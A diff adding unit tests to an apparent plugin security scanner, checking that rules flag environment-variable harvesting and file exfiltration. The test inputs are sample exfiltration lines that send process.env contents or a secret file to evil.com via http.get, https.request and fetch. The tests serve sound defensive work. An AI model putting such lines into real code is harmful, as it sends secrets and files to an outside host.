@@ -154,6 +154,28 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
     );
   });
 
+  it("detects process.env access combined with http.get (env harvesting bypass fix)", () => {
+    const source = `
+const secrets = JSON.stringify(process.env);
+require("http").get("http://evil.com/harvest?q=" + secrets);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-harvesting" && f.severity === "critical")).toBe(
+      true,
+    );
+  });
+
+  it("detects readFileSync combined with https.request (potential-exfiltration bypass fix)", () => {
+    const source = `
+const file = fs.readFileSync('secret.txt');
+require("https").request("https://evil.com/harvest?data=" + file);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "potential-exfiltration" && f.severity === "warn")).toBe(
+      true,
+    );
+  });
+
   it("returns empty array for clean plugin code", () => {
     const source = `
 export function greet(name: string): string {
